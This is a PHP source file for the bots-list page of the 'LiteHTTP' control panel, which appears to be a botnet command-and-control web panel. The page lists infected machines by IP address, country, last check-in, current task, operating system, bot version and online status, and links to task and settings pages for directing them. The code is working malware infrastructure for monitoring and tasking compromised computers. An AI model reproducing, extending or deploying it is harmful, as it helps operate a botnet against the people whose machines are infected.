<?php
$u = explode(":", $_SESSION['LiteHTTP']);
$username = $u[0];

include 'inc/stats.php';
include 'inc/geo/geoip.inc';
$gi = geoip_open("inc/geo/GeoIP.dat");
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>Control Panel</title>
	<meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="css/ionicons.min.css" rel="stylesheet" type="text/css" />
	<link href="css/main.css" rel="stylesheet" type="text/css" />
	<link href="css/datatables/dataTables.bootstrap.css" rel="stylesheet" type="text/css" />
	<!--[if lt IE 9]>
		<script src="js/html5shiv.js"></script>
		<script src="js/respond.min.js"></script>
	<![endif]-->
</head>
<body class="wysihtml5-supported skin-black fixed">
	<header class="header">
		<a href="?p=main" class="logo">
			LiteHTTP
		</a>
		<nav class="navbar navbar-static-top" role="navigation">
			<div class="navbar-right">
				<ul class="nav navbar-nav">
					<li class="dropdown user user-menu">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown">
							<i class="glyphicon glyphicon-user"></i>
							<span><?php echo $username; ?> <i class="caret"></i></span>
						</a>
						<ul class="dropdown-menu">
							<li class="user-footer">
								<div class="pull-left">
									<a href="?p=account" class="btn btn-default btn-flat">Edit Account</a>
								</div>
								<div class="pull-right">
									<a href="?p=logout" class="btn btn-default btn-flat">Logout</a>
								</div>
							</li>
						</ul>
					</li>
				</ul>
			</div>
		</nav>
	</header>
	<div class="wrapper row-offcanvas row-offcanvas-left">
		<aside class="left-side sidebar-offcanvas">
			<section class="sidebar">
				<ul class="sidebar-menu">
					<li>
						<a href="?p=main">
							<i class="fa fa-dashboard"></i> <span>Dashboard</span>
						</a>
					</li>
					<li class="active">
						<a href="?p=bots">
							<i class="fa fa-list"></i> <span>Bots</span>
							<small class="badge pull-right bg-green"><?php echo $online; ?></small>
						</a>
					</li>
					<li>
						<a href="?p=tasks">
							<i class="fa fa-bar-chart"></i> <span>Tasks</span>
						</a>
					</li>
					<li>
						<a href="?p=settings">
							<i class="fa fa-cog"></i> <span>Settings</span>
						</a>
					</li>
					<li>
						<a href="?p=users">
							<i class="fa fa-users"></i> <span>Users</span>
						</a>
					</li>
					<li>
						<a href="?p=logs">
							<i class="fa fa-list-alt"></i> <span>Panel Logs</span>
						</a>
					</li>
					<li>
						<a href="?p=help">
							<i class="fa fa-question"></i> <span>Help</span>
						</a>
					</li>
				</ul>
			</section>
		</aside>
		<aside class="right-side">
			<section class="content">
				<div class="row">
					<div class="col-lg-12 col-xs-24">
						<table id="botlist" class="table table-condensed table-hover table-striped table-bordered">
							<thead>
								<tr>
									<th>#</th>
									<th>IP Address</th>
									<th>Country</th>
									<th>Last Response</th>
									<th>Current Task</th>
									<th>Operating System</th>
									<th>Bot Version</th>
									<th>Status</th>
								</tr>
							</thead>
							<tbody>
								<?php
								$bots = $odb->query("SELECT * FROM bots ORDER BY lastresponse DESC");
								$unix = $odb->query("SELECT UNIX_TIMESTAMP()")->fetchColumn(0);
								while ($b = $bots->fetch(PDO::FETCH_ASSOC))
								{
									$id = $b['id'];
									$ip = $b['ipaddress'];
									$cn = geoip_country_name_by_id($gi, $b['country']);
									$fl = strtolower(geoip_country_code_by_id($gi, $b['country']));
									$lrd = $b['lastresponse'];
									$lr = date("m-d-Y, h:i A", $lrd);
									$ct = $b['currenttask'];
									$os = $b['operatingsys'];
									$bv = $b['botversion'];
									$st = "";
									if (($lrd + ($knock + 120)) > $unix)
									{
										$st = '<small class="badge bg-green">Online</small>';
									}else{
										if ($lrd + $deadi < $unix)
										{
											$st = '<small class="badge bg-red">Dead</small>';
										}else{
											$st = '<small class="badge bg-yellow">Offline</small>';
										}
									}
									echo '<tr><td>'.$id.'</td><td><a href="?p=details&id='.$id.'">'.$ip.'</a></td><td>'.$cn.'&nbsp;&nbsp;<img src="img/flags/'.$fl.'.png" /></td><td data-order="'.$lrd.'">'.$lr.'</td><td>#'.$ct.'</td><td>'.$os.'</td><td>'.$bv.'</td><td>'.$st.'</td></tr>';
								}
								?>
							</tbody>
						</table>
					</div>
				</div>
			</section>
		</aside>
	</div>
	<script src="js/jquery.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/jquery-ui.min.js" type="text/javascript"></script>
	<script src="js/plugins/datatables/jquery.dataTables.js" type="text/javascript"></script>
	<script src="js/plugins/datatables/dataTables.bootstrap.js" type="text/javascript"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			$("#botlist").dataTable({
				"order": [[ 3, "desc" ]],
				"iDisplayLength": 25,
				"aLengthMenu": [[10, 25, 50, 100, 200, -1], [10, 25, 50, 100, 200, "All"]],
				"oLanguage": {
					"sEmptyTable": "No data to display"
				}
			});
		});
	</script>
</body>
</html>